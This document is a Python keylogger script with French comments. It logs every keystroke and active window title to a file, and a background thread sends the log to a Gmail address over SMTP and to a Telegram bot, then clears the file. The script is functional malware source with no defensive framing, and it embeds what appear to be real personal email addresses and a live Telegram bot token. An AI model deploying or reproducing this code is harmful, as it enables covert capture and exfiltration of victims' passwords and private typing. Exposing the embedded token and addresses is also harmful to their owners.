from pynput import keyboard
import pygetwindow as gw
import time
import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import telegram

# --- CONFIGURATION DE L'ENVOI D'EMAIL ---
# IMPORTANT: Utilisez un "Mot de passe d'application" généré par Google, pas votre mot de passe habituel.
EMAIL_ADDRESS = "nkenfackloic2002@gmail.com"  # L'adresse email qui envoie les logs
EMAIL_PASSWORD = "votre_mot_de_passe_application"  # Le mot de passe d'application de 16 caractères
RECIPIENT_EMAIL = "nkenfacklandoloic@gmail.com" # L'adresse qui reçoit les logs
SEND_INTERVAL = 36  # Intervalle d'envoi en secondes (3600s = 1 heure)
LOG_FILE = "keylog.log"
# -----------------------------------------

# --- CONFIGURATION DE L'ENVOI TELEGRAM ---
TELEGRAM_BOT_TOKEN = "7347047446:AAHT8BfaDJ-9tWgW4PEEuiOIch-uteeZlRk"  # Le token obtenu de BotFather
TELEGRAM_CHAT_ID = "5622778224"        # L'ID de votre conversation avec le bot
# -----------------------------------------

count = 0  # Compteur global
active_window = "" # Garder en mémoire la fenêtre active

# Un verrou pour éviter les conflits d'accès au fichier de log
log_lock = threading.Lock()

def on_press(key):
    global count, active_window

    # Vérifier si la fenêtre active a changé
    try:
        current_window = gw.getActiveWindow().title
        if current_window != active_window:
            active_window = current_window
            with log_lock:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"\n\n[WINDOW: {active_window} - {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
    except Exception: # Gérer le cas où il n'y a pas de fenêtre active
        pass
    with log_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f: # Correction de l'indentation
            try:
                f.write(f"['{key.char}']")
            except AttributeError:
                # Pour la touche Entrée, on va à la ligne
                if key == keyboard.Key.enter:
                    f.write("[ENTER]\n")
                    count = 0
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    f.write("[CTRL]")
                else:
                    f.write(f"[{key}]")
            count += 1
            # Va à la ligne tous les 20 caractères pour la lisibilité
            if count >= 20:
                f.write("\n")
                count = 0
    # Si la touche Echap est pressée, on arrête le listener
    if key == keyboard.Key.esc:
        return False

def send_log_by_email():
    with log_lock:
        try:
            with open(LOG_FILE, "r+", encoding="utf-8") as f:
                log_content = f.read()
                if not log_content.strip():
                    print("Fichier de log vide, pas d'envoi.")
                    return # Ne rien envoyer si le fichier est vide

                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = RECIPIENT_EMAIL
                msg['Subject'] = f"Keylog Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"

                body = "Rapport des frappes clavier en pièce jointe."
                msg.attach(MIMEText(body, 'plain'))

                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(log_content.encode('utf-8'))
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f"attachment; filename= {LOG_FILE}")
                msg.attach(attachment)

                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                text = msg.as_string()
                server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
                server.quit()

                # Vider le fichier après l'envoi réussi
                f.seek(0)
                f.truncate()
                print(f"Log envoyé à {RECIPIENT_EMAIL} et fichier vidé.")

        except FileNotFoundError:
            print("Fichier de log non trouvé. Il sera créé à la prochaine frappe.")
        except Exception as e:
            print(f"Erreur lors de l'envoi de l'email: {e}")

def send_log_by_telegram():
    with log_lock:
        try:
            with open(LOG_FILE, "rb") as f:
                log_content = f.read()
                if not log_content.strip():
                    print("Fichier de log vide, pas d'envoi Telegram.")
                    return

                # IMPORTANT: Rembobiner le fichier avant de l'envoyer
                f.seek(0)

                bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
                caption = f"Rapport Keylogger - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                bot.send_document(chat_id=TELEGRAM_CHAT_ID, document=f, filename=LOG_FILE, caption=caption)
                print(f"Log envoyé à Telegram (Chat ID: {TELEGRAM_CHAT_ID}).")

        except FileNotFoundError:
            # Pas grave si le fichier n'existe pas encore
            pass
        except Exception as e:
            print(f"Erreur lors de l'envoi sur Telegram: {e}")

def report():
    while True:
        time.sleep(SEND_INTERVAL)
        send_log_by_email()
        send_log_by_telegram() # On envoie aussi sur Telegram

if __name__ == "__main__":
    report_thread = threading.Thread(target=report, daemon=True)
    report_thread.start()
    print("Keylogger démarré. Envoi des logs toutes les heures. Appuyez sur 'Echap' pour arrêter.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()